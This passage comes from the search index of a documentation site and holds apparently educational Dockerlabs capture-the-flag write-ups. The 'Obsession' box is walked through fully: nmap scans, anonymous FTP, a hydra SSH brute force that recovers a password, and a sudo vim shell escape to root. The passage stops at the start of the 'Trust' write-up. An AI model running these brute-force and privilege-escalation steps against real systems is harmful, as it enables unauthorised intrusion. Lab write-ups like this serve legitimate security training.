allPorts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: extractPorts.tmp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 \n   2   \u2502 [*] Extracting information...\n   3   \u2502 \n   4   \u2502     [*] IP Address: 172.17.0.2\n   5   \u2502     [*] Open ports: 21,22,80\n   6   \u2502 \n   7   \u2502 [*] Ports copied to clipboard\n   8   \u2502 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u276f nmap -sCV -p21,22,80 172.17.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:12 CEST\nNmap scan report for 172.17.0.2\nHost is up (0.000053s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:172.17.0.1\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.5 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt\n|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)\n|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)\n80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Russoski Coaching\n</code></pre> <p>Open ports: FTP (21), SSH (22), HTTP (80).</p>"},{"location":"en/writeups/Obsession/#exploitation","title":"Exploitation","text":"<p>Since FTP is open, we first check if anonymous login is allowed \u2014 and it is:</p> <pre><code>\u276f ftp obsession\nConnected to obsession.\n220 (vsFTPd 3.0.5)\nName (obsession:godack): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n</code></pre> <p>Listing files shows two: chat-gonza.txt and pendientes.txt. We download and inspect them:</p> <pre><code>ftp&gt; ls\n229 Entering Extended Passive Mode (|||34980|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt\n-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt\n226 Directory send OK.\nftp&gt; get chat-gonza.txt\nlocal: chat-gonza.txt remote: chat-gonza.txt\n229 Entering Extended Passive Mode (|||11500|)\n150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).\n100% |*************************************************************************|   667   3.78 MiB/s  00:00 ETA\n226 Transfer complete.\n667 bytes received in 00:00 (713.43 KiB/s)\nftp&gt; get pendientes.txt\nlocal: pendientes.txt remote: pendientes.txt\n229 Entering Extended Passive Mode (|||63348|)\n150 Opening BINARY mode data connection for pendientes.txt (315 bytes).\n100% |*************************************************************************|   315   1.98 MiB/s  00:00 ETA\n226 Transfer complete.\n315 bytes received in 00:00 (465.38 KiB/s)\n</code></pre> <p>From the contents, we deduce there are two possible users: Gonza and Russoski.</p> <pre><code>\u276f cat chat-gonza.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: chat-gonza.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 [16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal N\u00e1gore como dices?\n   2   \u2502 [16:28, 16/6/2024] Russoski: es una aut\u00e9ntica princesa pff, le he hecho hasta un v\u00eddeo y todo, lo tengo ya subido y tengo la URL guardada\n   3   \u2502 [16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres\n   4   \u2502 [21:52, 16/6/2024] Gonza: buah la verdad ten\u00edas raz\u00f3n eh, es hermosa esa chica, del 9 no baja\n   5   \u2502 [21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, as\u00ed s\u00ed\n   6   \u2502 [22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y s\u00ed buen training hoy\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u276f cat pendientes.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: pendientes.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 1 Comprar el Voucher de la certificaci\u00f3n eJPTv2 cuanto antes!\n   2   \u2502 \n   3   \u2502 2 Aumentar el precio de mis asesor\u00edas online en la Web!\n   4   \u2502 \n   5   \u2502 3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!\n   6   \u2502 \n   7   \u2502 4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos\n   8   \u2502   permisos habilitados que no son del todo seguros..\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre> <p>While running brute force attacks with hydra on SSH for both users, we investigate the website. It seems Russoski is the main user, and indeed, hydra finds his password:</p> <pre><code>\u276f hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://obsession\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-19 10:48:57\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://obsession:22/\n[22][ssh] host: obsession   login: russoski   password: iloveme\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 5 final worker threads did not complete until end.\n[ERROR] 5 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-19 10:49:34\n</code></pre> <p>We log in via SSH:</p> <pre><code>\u276f ssh russoski@obsession\nrussoski@obsession's password: \nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.25-amd64 x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\nLast login: Tue Jun 18 04:38:10 2024 from 172.17.0.1\nrussoski@c1489df97f06:~$\n</code></pre>"},{"location":"en/writeups/Obsession/#privilege-escalation","title":"Privilege Escalation","text":"<p>For a more comfortable shell, we fix the tty:</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>We check sudo permissions and exploit this to spawn a root shell:</p> <pre><code>russoski@c1489df97f06:~$ sudo -l\nMatching Defaults entries for russoski on c1489df97f06:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser russoski may run the following commands on c1489df97f06:\n    (root) NOPASSWD: /usr/bin/vim\nrussoski@c1489df97f06:~$ sudo vim -c ':!/bin/bash'\n\nroot@c1489df97f06:/home/russoski# whoami\nroot\nroot@c1489df97f06:/home/russoski# \n</code></pre> <p>Root obtained!</p>"},{"location":"en/writeups/Obsession/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Scans with nmap</li> <li>Anonymous login on the FTP port</li> <li>Brute force attack with hydra</li> <li>Privilege escalation with vim</li> </ol>"},{"location":"en/writeups/Trust/","title":"Write Up Trust","text":"<p>Difficulty: Super easy Dockerlabs link: https://dockerlabs.es/</p>"},{"location":"en/writeups/Trust/#environment-setup","title":"Environment setup","text":"<p>First of all, we deploy the machine using the script that comes when downloading it:</p> <pre><code>\u276f sudo ./auto_deploy.sh trust.tar\n[sudo] contrase\u00f1a para godack: \n\n                       ##        .         \n                 ## ## ##       ==         \n              ## ## ## ##      ===         \n          /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\\___/ ===       \n     ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~\n          \\______ o          __/           \n            \\    \\        __/            \n             \\____\\______/               \n\n  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ \n  |  \\ |  | |    |_/  |___ |__/ |    |__| |__] [__  \n  |__/ |__| |___ | \\_ |___ |  \\ |___ |  | |__] ___] \n\n\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.18.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Once deployed, we create the folder <code>trust-dockerlabs</code>, move inside, and use the mkt utility, which creates the folders nmap, content, exploits and scripts.</p> <pre><code>\u276f mkdir trust-dockerlabs\n\u276f cd trust-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf0c7 content\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf115 exploits\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf115 nmap\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf489 scripts\n</code></pre>"},{"location":"en/writeups/Trust/#reconnaissance","title":"Reconnaissance","text":"<p>Now that we know the IP address, we perform a full scan to find open ports in a stealthy and fast way:</p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 10:46 CEST\nInitiating ARP Ping Scan at 10:46\nScanning 172.18.0.2 [1 port]\nCompleted ARP Ping Scan at 10:46, 0.10s elapsed (1 total hosts)\nInitiating SYN Stealth Scan at 10:46\nScanning 172.18.0.2 [65535 ports]\nDiscovered open port 80/tcp on 172.18.0.2\nDiscovered open port 22/tcp on 172.18.0.2\nCompleted SYN Stealth Scan at 10:46, 2.88s elapsed (65535 total ports)\nNmap scan report for 172.18.0.2\nHost is up, received arp-response (0.000024s latency).\nScanned at 2025-08-17 10:46:09 CEST for 2s\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>So we discover that the open ports are SSH (22) and HTTP (80). With the extractPorts utility we copy them to the clipboard and then run a more thorough scan to discover the service and version running on those ports.</p> <pre><code>\u276f extractPorts allPorts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: extractPorts.tmp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 \n   2   \u2502 [*] Extracting information...\n   3   \u2502 \n   4   \u2502     [*] IP Address: 172.18.0.2\n   5   \u2502     [*] Open ports: 22,80\n   6   \u2502 \n   7   \u2502 [*] Ports copied to clipboard\n   8   \u2502 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u276f nmap -sCV -p22,80 172.18.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 10:49 CEST\nNmap scan report for 172.18.0.2\nHost is up (0.000058s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey: \n|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)\n|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.57 (Debian)\n</code></pre>"},{"location":"en/writeups/Trust/#exploitation","title":"Exploitation","text":"<p>Since a web service and SSH are running, we first gather information from the webpage before trying SSH. To do this, we add an entry to our local DNS (/etc/hosts) with the machine\u2019s name (<code>trust</code>) and its IP.</p> <pre><code>\u276f sudo vi /etc/hosts\n[sudo] contrase\u00f1a para godack: \n\u276f cat 